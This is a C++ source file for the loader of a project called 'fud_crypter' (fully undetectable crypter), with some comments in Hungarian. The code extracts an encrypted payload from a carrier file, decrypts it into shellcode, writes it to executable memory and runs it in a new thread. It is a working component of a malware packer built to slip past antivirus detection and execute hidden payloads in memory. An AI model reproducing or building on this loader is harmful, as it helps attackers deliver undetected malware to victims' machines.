#include "fud_crypter/loader.hpp"
#include "fud_crypter/carrier/factory.hpp"
#include "fud_crypter/crypto/factory.hpp"
#include "fud_crypter/memory/executable_memory.hpp"
#include "fud_crypter/platform.hpp"
#include <stdexcept>

namespace fud_crypter {

    Loader::Loader(const LoaderConfig& config)
    : config_(config)
    , logger_(std::make_shared<Logger>(config_.verbose ? LogLevel::DEBUG : LogLevel::INFO)) {}

    bool Loader::execute() {
        try {
            logger_->info("=== FUD Crypter Loader Starting ===");
            logger_->info("Carrier: " + config_.carrier_file);

            // 1. Payload kinyerése
            logger_->info("Phase 1: Extracting payload...");
            auto carrier = carrier::create_carrier(
                config_.carrier_file,
                config_,
                logger_
            );
            auto encrypted = carrier->extract_payload();
            logger_->success("Extracted " + std::to_string(encrypted.size()) + " bytes");

            // 2. Dekódolás
            logger_->info("Phase 2: Decrypting payload...");
            auto decryptor = crypto::create_decryptor(config_.key_file);
            auto shellcode = decryptor->decrypt(encrypted);
            logger_->success("Decrypted " + std::to_string(shellcode.size()) + " bytes");

            // 3. Memória foglalás és futtatás
            logger_->info("Phase 3: Allocating executable memory and executing...");
            memory::ExecutableMemory exec_mem(shellcode.size());
            exec_mem.write(shellcode);
            exec_mem.make_executable();

            platform::ThreadHandle thread = platform::create_thread(
                reinterpret_cast<platform::ThreadFunction>(exec_mem.ptr()),
                                                                    nullptr
            );
            platform::wait_for_thread(thread);
            platform::close_thread(thread);

            logger_->success("=== Execution completed successfully ===");
            return true;

        } catch (const std::exception& e) {
            logger_->fatal(std::string("Loader execution failed: ") + e.what());
            return false;
        }
    }

} // namespace fud_crypter
